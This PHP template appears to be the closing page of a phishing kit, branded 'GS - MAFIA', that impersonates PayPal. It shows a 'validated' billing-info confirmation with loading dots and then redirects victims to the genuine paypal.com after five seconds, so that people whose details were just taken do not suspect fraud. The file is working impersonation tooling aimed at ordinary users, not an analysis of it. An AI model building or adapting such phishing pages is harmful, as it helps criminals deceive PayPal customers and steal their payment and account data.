<?php
#   ___   ___       __  __     _     ___   ___     _   
#  / __| / __|     |  \/  |   /_\   | __| |_ _|   /_\  
# | (_ | \__ \  _  | |\/| |  / _ \  | _|   | |   / _ \ 
#  \___| |___/ (_) |_|  |_| /_/ \_\ |_|   |___| /_/ \_\
include("languages/index.php");
include ("languages/lang".$_SESSION['gs_langlink']);
?>
<meta http-equiv="refresh" content="5;URL='http://paypal.com/'" /> 
<div class="StickyContainer">
	<div class="StickyBody full-height">
		<div class="CTABannerContainer CTABannerContainer--billinginfopage ">
			<div class="DefaultCTABanner">
			</div>
			<div class="DefaultGreeting">
				<div class="cta-banner">
					<div class="cta-headline">
						<span class="cta-name">
							<center>
								<h2 style="margin-bottom: 0px;><?php echo $gs_string36 ?></h2>
								<img src="images/validated.png"></center>
								<br>
							</span>
							<div class="textInput lap">
								<div class="fields email large">
									<div class="nativeDropdown  large ">
										<div class="selectDropdown ">
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="body-content">
				<?php echo $gs_string37 ?><img src="images/loading-dots.gif">
			</div>
		</div>
	</div>